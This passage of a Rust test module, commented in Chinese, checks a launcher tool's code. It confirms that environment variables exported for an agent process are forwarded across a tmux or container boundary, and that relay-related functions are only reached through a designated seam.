        let right = forwarded_by_container_path(CCM);
        assert_eq!(
            right.len(),
            3,
            "\n★ 容器路的转发面从 3 条变成了 {} 条：{right:?}\n\
             09-02 现打的 3 条 = `CLAUDE_CONFIG_DIR`（`R08`，转发**继承**值）· \
             `ANTHROPIC_BASE_URL`（`K-H2b`）· `CCM_LAUNCH_ID`（`K-P5c`）。\n\
             加一条是好事，但要回来把这个分母改掉并写清新那条守的是谁 —— \
             否则这一格就变成一句没人维护的话。",
            right.len()
        );

        // ── ④ 正题：⊆ ─────────────────────────────────────────────────────────
        let missing = not_forwarded(&left, &right);
        assert!(
            missing.is_empty(),
            "\n★★ **有变量拼在 `ccm` 外面 `export` 了，而容器路没有转发它**：{missing:?}\n\
             左集（外面 export，按函数体切）：{left:?}\n\
             右集（容器路转发，窗口里逐行认）：{right:?}\n\
             ⇒ 走 tmux 那条支的会话，这个变量在 tmux 边界被**整个吃掉**\
             （`update-environment` 的默认列表不含它），\n\
             而症状是「起会话方以为交下去了」，**指不向这里**。\
             这个坑到今天已经是第三次了（`R08` · `K-H2b` · `K-P5c`）。\n\
             ⇒ 修法：在 `shared/ccm` 容器路那个窗口里照那三条的形状加一行\n\
             `payload=\"export <VAR>=$(sq \\\"$<VAR>\\\"); $payload\"`。\n\
             🔴 **本条买不到面一**（这台机器上已装的旧 `ccm` 副本会静默吃掉它）—— 那归 `K26`。"
        );
    }

    /// ★★★ `KP5ED2` **活体夹具**：今天零违规 ⇒ 上面那条是空真 ⇒ 牙必须长在这一格上。
    ///
    /// # 为什么非有它不可（`K-G4 §7 裁六` 的实测结论，逐字带过来）
    ///
    /// `K-G4` 那一拍 PM 打过这一刀：**掏空判据共用的那个原语时，三条方向判据全留绿，
    /// 只有活体夹具红。** ⇒ 一条「今天零违规」的判据，连自己的地基被抽掉都不会响。
    ///
    /// # 它怎么做到「跑的是判据本体，不是它的复刻」
    ///
    /// 上面那条与本条**共用**四个函数（[`fn_body`] · [`exported_var_names`] ·
    /// [`forwarded_by_container_path`] · [`not_forwarded`]）。本条只换**输入**：
    /// - **活体甲**：拿真的 `shared/ccm`，把 `CCM_LAUNCH_ID` 那条转发**抠掉一行**
    ///   （`R08`/`K-H2b`/`K-P5c` 那个坑的复发形），断言差集**恰好**点名它；
    /// - **活体乙**：在左集上**真加一截会 export 的渲染器体**（本件买的「第四次」那一形），
    ///   断言差集**恰好**点名那个新变量。
    ///
    /// ⇒ 把 [`exported_var_names`] 掏空成 `vec![]`：上面那条**照样绿**（左集空 ⇒ ⊆ 空真），
    /// 而本条两格**都红**。那正是这一格存在的全部理由。
    ///
    /// # ⚠ 它买不到什么
    ///
    /// 它量的是**判据认不认得出违规**，不是「生产上真会不会漏」——
    /// 后者由上面那条在真树上跑。两格各买各的，别合并读。
    #[test]
    fn the_outside_export_gate_really_reddens_on_a_live_breach() {
        const CCM: &str = include_str!("../../../../shared/ccm");
        let hist = guard_core::production_code(include_str!("../../history.rs"));
        let pay = guard_core::production_code(include_str!("payload.rs"));
        let body_relay = fn_body(&pay, "pub fn relay_env_prefix_posix(");
        let body_id = fn_body(&hist, "fn launch_identity_env_prefix(")
            .replace("{LAUNCH_ID_VAR}", crate::history::LAUNCH_ID_VAR);
        let left = exported_var_names(&[body_relay, body_id]);
        let right = forwarded_by_container_path(CCM);
        // 非空对照：干净树上差集是空的 —— 证明下面两格的红不是「本来就红」。
        assert!(
            not_forwarded(&left, &right).is_empty(),
            "干净树上就已经有人没被转发了 —— 先去看 \
             `every_variable_exported_outside_ccm_is_forwarded_by_the_container_path`，\
             本条此刻量不了「夹具红不红」"
        );

        // ── 活体甲：容器路那一条转发被抽掉 ──────────────────────────────────────
        let var = crate::history::LAUNCH_ID_VAR;
        let line = format!("    payload=\"export {var}=$(sq \"${var}\"); $payload\"\n");
        assert_eq!(
            CCM.matches(line.as_str()).count(),
            1,
            "要抠掉的那一行在 `shared/ccm` 里不是恰好一处 —— 夹具的地基变了，先修夹具。要找的：{line:?}"
        );
        let holed = CCM.replace(line.as_str(), "");
        assert!(
            holed.len() < CCM.len(),
            "夹具什么都没抠掉 —— 下面那一格是空真"
        );
        assert_eq!(
            not_forwarded(&left, &forwarded_by_container_path(&holed)),
            vec![var.to_string()],
            "\n★★ **活体夹具没红。** 造的活体是：容器路把 `{var}` 那条转发抠掉了\n\
             （那正是 `R08` · `K-H2b` · `K-P5c` 三次同坑的复发形），而判据本体没认出来。\n\
             ⇒ 上面那条今天的绿是**空真** —— 先修判据本体，别改这里。"
        );

        // ── 活体乙：外面多 export 了一个没人转发的变量（本件买的「第四次」） ──────
        const LIVE: &str = "CCM_P5E_LIVE_PROBE";
        let fourth = format!("{{ format!(\"export {LIVE}={{}}; \", x) }}");
        let mut left_plus = left.clone();
        left_plus.extend(exported_var_names(&[fourth]));
        assert_eq!(
            not_forwarded(&left_plus, &right),
            vec![LIVE.to_string()],
            "\n★★ **活体夹具没红。** 造的活体是：外面那一串上多拼了一截\n\
             `export {LIVE}=…; `，而容器路没有转发它 —— 判据本体没认出来。\n\
             ⇒ 「第四次在提交那一刻有人红」这件事**买不到**，而那是本件的全部正题。"
        );
    }

    /// ★★★ `KH2B3`：**注入点的人群是枚举出来的、有判据数着** —— 多一个渲染器不接线当场红。
    ///
    /// # 人群怎么定的（按**形状**，不按主题名 —— `K20`）
    ///
    /// 人群 = 「**生产段里给 agent 进程渲染 env 前缀**的地方」。
    /// 认它的形状是：产出一段 `export <VAR>=` / `$env:<VAR>=` 的串，或直接给要拉起 agent
    /// 的那个进程 `.env(k, v)`。⚠ **刻意不写成「grep 源码里有没有 `ANTHROPIC_BASE_URL`」**
    /// —— 那把尺子在构造上量不出「它会不会咬这一格」（`K-H2a` 那一族人群换了四版的来历）。
    ///
    /// # 今天的人群是 5 处，逐处登记它接没接上（**默认拒绝：不登记就红**）
    ///
    /// | # | 住址 | 接上了吗 |
    /// |---|---|---|
    /// | A | 本文件 `relay_env_prefix_posix` | **接上**（`history.rs` 的 POSIX 分支用它） |
    /// | B | `history.rs` 的 `$env:` 分支 | **接上**（`relay_env_prefix_ps`），⚠ 只到「编得过」 |
    /// | C | `shared/ccm` | **没接** —— 见下面 `NOT_WIRED` 里的理由 |
    /// | D | `src/shell-quote.ts::buildEnvPrefix`（`launch-render-fallback.ts` 的真发射点） | **没接** |
    /// | E | `src-tauri/src/launch.rs` 的 `.env(k, v)`（开窗那一跳，进程级） | **没接** |
    ///
    /// ⚠ **本条钉的是「决定点的个数」，不是「每一处都接上了」** ——
    /// 没接上的那三处（C · D · E）各有一条写下来的理由。
    ///
    /// # 🔴 它抓得到什么、抓不到什么（`D5 阻-3`，这一句被点了三次名才改）
    ///
    /// 本条是一张**五个文件的闭表**（`sites` 5 格 + `sites.len() == 5` 这个常量）。
    /// - **抓得到**：这五个文件里某一处的发射点消失 / 多出一处（`n != want` ⇒ 红）；
    ///   有人把 `sites` 改成 4 格或 6 格（`sites.len()` ⇒ 红）。
    /// - 🔴 **抓不到**：**一个新文件**里出现第 6 个 env 前缀渲染器 —— 本条一个字节都不会动
    ///   （它只按名单逐格数 needle 的处数，名单之外的世界它没看过）。
    ///   ⇒ 这是一条**诚实边界**，不是「今天恰好没有」。
    ///   先前件文件 `§4` 与本头注都写着「**多出第 6 处当场红**」，那是假话；
    ///   `D2 问一②` · `D4 §G2` · `D5 阻-3` **三次点名**，这一拍改成实话。
    /// - **解锁条件**（`testing.md` 三.11 要的那一栏）：要买「新文件里的第 6 处也红」，
    ///   得把本条换成**目录扫描型**（自己定扫描面 + 排除 `vendor/` / `node_modules/` / `target/`）。
    ///   ⚠ 那一改的风险是本区最高频的那族病（量具的作用域对不上它守的性质）⇒ 单独立件再做，
    ///   别顺手改。
    #[test]
    fn the_population_that_renders_env_prefixes_for_the_agent_process_is_enumerated() {
        // 每一格：住址 · 认它的针 · 生产段里该有几处 · 接没接上（接不上给理由）。
        struct Site {
            what: &'static str,
            src: &'static str,
            needle: &'static str,
            want: usize,
            wired: Option<&'static str>,
        }
        const NOT_WIRED_CCM: &str =
            "`shared/ccm` 结构上不是收口点（三条生产路绕开它：`history.rs` 的 \
             `else claude --resume` 支 · tab 右键就地 resume 的默认 launcher 是裸 `claude` · \
             远端兜底渲染器）⇒ 把**注入**放在它身上会长出一个恒绿的假闸。\
             ⚠ 但它**转发**（08-28 第二拍加的：容器路把继承来的 `ANTHROPIC_BASE_URL` \
             写进载荷内侧，否则在 tmux 边界被吃掉）—— 「不当收口点」≠「不许碰它」，\
             那一格由 `the_ccm_container_path_forwards_the_relay_base_url_across_the_tmux_boundary` \
             钉着，与本条数的是两件事。";
        const NOT_WIRED_TS: &str =
            "TS 兜底渲染器服务的是**远端**那族（`tryRenderCli` 拒了之后的回落），\
             而本件 `§0e` 裁四明写只保本机、远端那一半 `判不了`（要先给 `creds.relay-key` 找到主人）。";
        const NOT_WIRED_WINDOW: &str =
            "开窗那一跳给的是**终端进程**的 env（`daemon_bin_env_for_window`），\
             而 agent 进程的 env 由它里面那条命令串自己带 ⇒ 同一件事在 A/B 两处已经做了，\
             在这里再做一遍是第二个决定点。";
        let sites = [
            Site {
                what: "A · payload.rs（POSIX 串级）",
                src: include_str!("payload.rs"),
                needle: "export ANTHROPIC_BASE_URL=",
                want: 1,
                wired: None,
            },
            Site {
                what: "B · history.rs（Windows 串级）",
                src: include_str!("../../history.rs"),
                needle: "$env:CLAUDE_CONFIG_DIR",
                want: 2,
                wired: None,
            },
            Site {
                what: "C · shared/ccm",
                src: include_str!("../../../../shared/ccm"),
                // 3 处：`--print` 配方行 · 容器路把继承值写进载荷内侧 · 真 exec 前那一句。
                needle: "export CLAUDE_CONFIG_DIR=",
                want: 3,
                wired: Some(NOT_WIRED_CCM),
            },
            Site {
                what: "D · src/shell-quote.ts",
                src: include_str!("../../../../src/shell-quote.ts"),
                // ⚠ 针取的是**发射点的形状**（拼进模板串的那一处），不是散文里的同一串
                //    —— 裸 `export CLAUDE_CONFIG_DIR=` 在本文件里另有 2 处注释命中。
                needle: "export CLAUDE_CONFIG_DIR=${posixQuote(",
                want: 1,
                wired: Some(NOT_WIRED_TS),
            },
            Site {
                what: "E · launch.rs（进程级，开窗那一跳）",
                src: include_str!("../../launch.rs"),
                // 3 处：POSIX 开窗 1 + Windows 两个 spawn 点各 1（`launch.rs` 自己那条
                // `every_terminal_window_backend_opens_carries_the_daemon_path` 也数这个数）。
                needle: ".env(k, v)",
                want: 3,
                wired: Some(NOT_WIRED_WINDOW),
            },
        ];
        assert_eq!(
            sites.len(),
            5,
            "人群从 5 处变了 —— 先回来读本条头注那张表，再决定新那一处要不要接中转。\n\
             ⚠ 这是一张**闭表**：它数的是这五个文件，**新文件里的第 6 个渲染器它看不见**\n\
             （头注「抓不到什么」那一节记着这条诚实边界与它的解锁条件）。"
        );
        for s in &sites {
            let prod = guard_core::production_code(s.src);
            assert!(
                prod.len() > 500,
                "{}：剥完只剩 {} 字节 —— 抽取器坏了，本格是空真",
                s.what,
                prod.len()
            );
            let n = prod.matches(s.needle).count();
            assert_eq!(
                n, s.want,
                "{}：生产段里 `{}` 的处数从 {} 变成了 {n}。\n\
                 ⇒ 这一层是「谁给 agent 进程定 env」的人群，多一处就多一个能各自答错\n\
                 「这次拉起走不走中转」的决定点。要么把它接上 `relay_env_prefix_*`，\n\
                 要么在本条的表里给它写一条不接的理由。",
                s.what, s.needle, s.want
            );
            if let Some(why) = s.wired {
                assert!(why.len() > 40, "{}：不接的理由太短，等于没写", s.what);
            }
        }
        // ★ 反面：本文件的 POSIX 那一处**必须真的接上了**（不然上面整张表可以全是「没接」）。
        assert_eq!(
            relay_env_prefix_posix("http://127.0.0.1:8788/s/a/b/c"),
            "export ANTHROPIC_BASE_URL='http://127.0.0.1:8788/s/a/b/c'; "
        );
        assert_eq!(
            relay_env_prefix_ps("http://127.0.0.1:8788/s/a/b/c"),
            "$env:ANTHROPIC_BASE_URL='http://127.0.0.1:8788/s/a/b/c'; "
        );
    }

    /// ★★★ `D6 阻-4` 的**人群闸**：谁绕开 `history::RelayFactSources` / `history::LaunchSink`
    /// 那两条缝，直接去调那几个取值口 / 那两个送法 ⇒ **当场红**。
    ///
    /// # 它为什么必须是一道闸，而不是一句头注
    ///
    /// 上一拍（08-28）买那条缝时，`RelayFactSources` 的头注里逐字写着
    /// 「这两个取值口的**生产消费方恰好 2**」，并把那句话当成了闸。
    /// `D6` 的刀 `E5` 打穿它：在 `lib.rs` 加**第三个**消费方、绕开缝直接调
    /// `history::relay_rows()` / `local_daemon::relay_running()`
    /// ⇒ **`1227 passed; 0 failed`、`GATE: OK`、四个数与干净树逐字相同。**
    /// ⇒ 那句头注买到的是「**这两处**走缝」，**没买到「所有人都得走缝」**。
    /// ★ PM `§8 裁四` 的定性：**治一个「今天数出来的 N」的过程中，长出了一个新的。**
    ///
    /// # 它钉的是**零调用点**（不是「今天有几个消费方」）
    ///
    /// 走缝的写法里，那几个函数只以**函数指针**出现（`rows: relay_rows,`）——
    /// **没有括号**。⇒ 只要断言「调用形在全树生产段里恰好只剩它们自己的定义行」，
    /// 这道闸就与「今天有几个消费方」**完全脱钩**：明天多十个消费方，只要都走缝，本条不动；
    /// 谁不走缝，第一次调用就把那个数顶上去。
    /// 裸标识符那一半（恰好 2 = 定义 + 缝里那一处）挡的是另一形：**把函数指针复制到第二个地方**。
    ///
    /// # ⚠ 分母与它抓不到什么（如实写）
    ///
    /// - 人群 = `src-tauri/src` **整棵树**的 `.rs`（`guard_core::scan_tree!` 目录扫描，
    ///   **不是手写名单**），逐份剥成生产段。
    /// - `scan_tree!` **按构造摘除调用者自己那份** ⇒ 本文件（`payload.rs`）不在人群里。
    ///   本文件今天不提那几个符号；真要在这里绕缝，本条看不见 —— **登记，不假装钉住了**。
    ///   （这也是本条**不住 `history.rs`** 的理由：住在那里等于把缝自己那一份摘出人群。）
    /// - 它只看 Rust 侧。别的 crate（daemon）够不着这几个符号（单向依赖）。
    /// - `let f = crate::history::relay_rows; f()` 这一形由裸标识符那一半接住（会变成 3）。
    #[test]
    fn nobody_reaches_the_relay_take_points_without_going_through_the_seam() {
        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src");
        let files = guard_core::scan_tree!(&root, &["rs"]);
        // 抽取器自检：树扫得到东西（否则下面整条是空真）。
        assert!(
            files.len() > 30,
            "只扫到 {} 份 `.rs` —— 取法坏了，本条会零命中地绿",
            files.len()
        );

        /// 裸标识符计数：`relay_rows_at` 里的 `relay_rows` 不算。
        fn bare(hay: &str, ident: &str) -> usize {
            hay.match_indices(ident)
                .filter(|(i, _)| {
                    let after = hay[i + ident.len()..].chars().next();
                    !after.is_some_and(|c| c.is_alphanumeric() || c == '_')
                })
                .count()
        }

        let mut prod_total = 0usize;
        // (裸标识符, 调用形恰好几处, 裸标识符恰好几处)
        //
        // ⚠ **这两格仍然是计数制，别顺手统一成下面那种住址制**〔ccbus-win 09-10〕：
        //   它们今天**没有第二类消费者** —— 除了缝，谁都不该调 `relay_rows`（读文件）
        //   / `relay_running`（问 daemon）。计数对它们仍然是对的答案。
        let mut counts = [
            // 定义 1 处（`history.rs`）+ 缝里 `rows: relay_rows,` 1 处。
            ("relay_rows", 1usize, 2usize, 0usize, 0usize),
            // 定义 1 处（`local_daemon.rs`）+ 缝里 `running: crate::local_daemon::relay_running,` 1 处。
            ("relay_running", 1, 2, 0, 0),
        ];

        // ═══ `platform_is_windows`：从**数个数**改成**点名住址**〔ccbus-win 09-10〕 ═══
        //
        // # 为什么这一格必须换制
        //
        // 这个取值口今天同时是两样东西，而这两句在**第一个非中转消费者出现之前**都为真：
        // · 它自己的头注说「**只有这一处**说得出这句话」⇒ 生产段问平台都该走它；
        // · 本条原来的计数说「恰好 1 处」⇒ 除了缝，谁都不许调。
        // `cc_bus::resolve_bash` 就是那第一个：它要问「这台机是不是 Windows」，
        // 好在 Windows 上按绝对路径定位 `bash`（裸名会被 `System32` 里的 WSL 存根抢走）。
        // ⇒ 一个数在回答两个从今天起答案不同的问题。这正是本条原文写的出路 ②
        //   「**重新裁定**并在这里说清为什么这一处可以不走」。
        //
        // ⚠ **走缝是错的出路**：为了问一句「是不是 Windows」而调 `history::relay_facts()`，
        //   会顺带跑 `relay_rows()`（读文件）与 `relay_running()`（问 daemon）。
        //
        // # 换制之后它比原来强在哪（**有读数，不是设想**）
        //
        // 另一条路是「把那个 1 改成 2」放行。它有一个**互相抵消**的失效形态。
        // 09-10 拿真树现打过（按本条同一套剥法离线模拟，两个方案喂同一刀）：
        //
        // | 树 | 住址制 | 「把数字改成 2」 |
        // |---|---|---|
        // | 干净 | 绿 | 绿 |
        // | 刀①：`mcp.rs` 里加一处绕缝调用 | **红**（点名 `mcp.rs`） | 红（调用形 3/期望 2） |
        // | 刀③：加那一处绕缝 **＋** 把 `cc_bus` 那处正当调用删掉 | **红**（两条都点名） | **绿** ← 抵消 |
        //
        // ⇒ 刀③ 那一格就是「一个数装两件事」最后的落点：总数没变，判据一声不吭。
        // 住址制两边都逮：没登记的住址 ⇒ 红；登记了却零命中 ⇒ 也红。
        const PLATFORM: &str = "platform_is_windows";
        /// `(相对路径, 这个文件里的调用形处数, 凭什么这一处可以不走缝)`。
        /// **默认拒绝**：人群从源码派生，没登记的住址当场红。
        const PLATFORM_TAKE_SITES: &[(&str, usize, &str)] = &[
            ("history.rs", 1, "取值口**自己的定义行** —— 它不是调用点"),
            (
                "cc_bus.rs",
                1,
                "`resolve_bash` 的平台那一格〔ccbus-win 09-10〕。它不走缝的理由是\
                 **缝答的不是它要问的东西**：`RelayFactSources` 是「中转」那三件事的取值口，\
                 而这里只要「是不是 Windows」，走缝要顺带付 `relay_rows()`（读文件）\
                 与 `relay_running()`（问 daemon）两笔钱。\
                 ⚠ 它**没有**因此自己写 `cfg!(windows)` —— 那句话仍然只有一个家，\
                 由 `cc_bus::tests::the_bash_cc_bus_runs_is_resolved_in_exactly_one_place` \
                 从另一头钉住（那条判据要求本文件里 `cfg!(windows)` 恰好 0 处）。",
            ),
        ];
        // 抽取器自检：登记 0 处等于给自己开后门（那一行永远命中不了、也永远不会红）。
        for (site, want, _) in PLATFORM_TAKE_SITES {
            assert!(*want >= 1, "住址 {site} 登记了 0 处 —— 那是个后门，不是登记");
        }
        let mut platform_sites: Vec<(String, usize)> = Vec::new();
        let mut platform_bare = 0usize;
        // 送法那一半：人群是**除 `launch.rs` 以外**的全树 —— 送法自己在那个文件里当然要被调。
        let mut sink_calls: Vec<String> = Vec::new();

        for (path, raw) in &files {
            let prod = guard_core::production_code(raw);
            prod_total += prod.len();
            // ⚠ 草堆这一侧**在这里就归一了分隔符**；针那一侧在下面的 `ends_with` 里
            //   也归一 —— **两侧都归一才作数**（本仓刚在 Windows 上栽过一次「只归一了
            //   草堆没归一针」：`guard-core` 的 `scan_tree!` 自排除曾是静默 no-op）。
            let rel = path.to_string_lossy().replace('\\', "/");
            for c in counts.iter_mut() {
                c.3 += prod.matches(&format!("{}(", c.0)).count();
                c.4 += bare(&prod, c.0);
            }
            let n = prod.matches(&format!("{PLATFORM}(")).count();
            if n > 0 {
                platform_sites.push((rel.clone(), n));
            }
            platform_bare += bare(&prod, PLATFORM);
            if !rel.ends_with("/launch.rs") {
                for sink in ["launch_local_posix", "launch_powershell_window"] {
                    let n = prod.matches(&format!("{sink}(")).count();
                    if n > 0 {
                        sink_calls.push(format!("{rel}: `{sink}(` × {n}"));
                    }
                }
            }
        }
        assert!(
            prod_total > 200_000,
            "全树剥完只剩 {prod_total} 字节 —— 剥法坏了，本条是空真"
        );

        for (ident, want_calls, want_bare, got_calls, got_bare) in counts {
            assert_eq!(
                got_calls, want_calls,
                "\n★★ `{ident}(` 在 `src-tauri/src` 的生产段里有 {got_calls} 处（期望 {want_calls} 处 = \
                 它自己的定义行）。\n\
                 ⇒ 有人**绕开 `history::RelayFactSources` 那条缝**直接调了这个取值口。\n\
                 那正是 `D6` 刀 `E5` 的形状：绕缝的那一处 ① 没有判据数得出来\n\
                 ② 它「问没问 / 用没用答案」也没有任何判据。\n\
                 ⇒ 合法出路只有两条：**改成走缝**（`history::relay_facts()`），\n\
                 或**重新裁定**并在这里说清为什么这一处可以不走。"
            );
            assert_eq!(
                got_bare, want_bare,
                "\n★ 裸标识符 `{ident}` 在生产段里有 {got_bare} 处（期望 {want_bare} 处 = \
                 定义 1 + `PRODUCTION_RELAY_FACTS` 里 1）。\n\
                 ⇒ 有人把这个取值口的**函数指针**复制到了第二个地方 —— \
                 那条缝就不再是唯一的入口了。"
            );
        }
        // ═══ `platform_is_windows` 的两半：住址（调用形）+ 指针副本（裸标识符） ═══
        let platform_calls: usize = platform_sites.iter().map(|(_, n)| *n).sum();
        assert!(
            platform_bare >= platform_calls,
            "抽取器坏了：裸标识符 {platform_bare} 处 < 调用形 {platform_calls} 处 —— \
             每一处调用形都必然也是一处裸标识符，反过来不成立"
        );
        // 「裸标识符 − 调用形」= **函数指针被复制到了几个地方**。今天只准有缝里那一处。
        // ⚠ 这样写而不是钉一个裸标识符总数：总数会跟着「合法调用点多了一个」一起动，
        //   于是又变回「一个数装两件事」——正是本格换制要治的那个病。
        let copies = platform_bare - platform_calls;
        assert_eq!(
            copies, 1,
            "\n★ `{PLATFORM}` 的**函数指针**在生产段里被复制到了 {copies} 个地方\
             （期望 1 = `PRODUCTION_RELAY_FACTS` 里那一处）。\n\
             ⇒ 多了：那条缝就不再是唯一入口；少了：缝上那一格不再由它答。"
        );

        let mut unregistered: Vec<String> = Vec::new();
        let mut hit = vec![0usize; PLATFORM_TAKE_SITES.len()];
        for (rel, n) in &platform_sites {
            // 针这一侧也归一（见上面那段注释）。用 `/` 起头，免得 `bus.rs` 命中 `cc_bus.rs`。
            let at = PLATFORM_TAKE_SITES
                .iter()
                .position(|(site, _, _)| rel.ends_with(&format!("/{}", site.replace('\\', "/"))));
            match at {
                Some(i) => hit[i] += n,
                None => unregistered.push(format!("  {rel} × {n}")),
            }
        }
        assert!(
            unregistered.is_empty(),
            "\n★★ 这些地方调了 `{PLATFORM}(` 却**没有登记住址**：\n{}\n\n\
             ⇒ 有人绕开 `history::RelayFactSources` 那条缝直接问了平台，而 ① 没有判据数得出来\n\
             ② 它「问没问 / 用没用答案」也没有任何判据。\n\
             合法出路两条：**改成走缝**（`history::relay_facts()`），\n\
             或**登记进 `PLATFORM_TAKE_SITES` 并写清为什么这一处可以不走**。",
            unregistered.join("\n")
        );
        for (i, (site, want, why)) in PLATFORM_TAKE_SITES.iter().enumerate() {
            assert_eq!(
                hit[i], *want,
                "\n★ 住址 `{site}` 登记了 {want} 处 `{PLATFORM}(`，实得 {} 处。\n\
                 · 实得 0 ⇒ 那处正当调用被删/改名了，**登记要跟着退**\n\
                 （登记了却零命中的行会让「有人删掉一处正当调用」悄悄溜过去）。\n\
                 · 实得更多 ⇒ 同一个文件里多了一处，逐处过一遍再改数。\n\
                 这一处当初凭什么可以不走缝：{why}",
                hit[i]
            );
        }

        assert!(
            sink_calls.is_empty(),
            "\n★★ `launch.rs` 之外还有人直接调那两个送法：{sink_calls:?}\n\
             ⇒ 本机拉起最后交出去的那一串**绕开了 `history::LaunchSink` 那条缝**，\n\
             而 `the_relay_prefix_is_really_prepended_to_the_command_that_gets_launched`\n\
             量的正是那条缝上的字符串 ⇒ 绕过去的那条路，前缀拼没拼上没有任何判据看得见。"
        );
    }
}
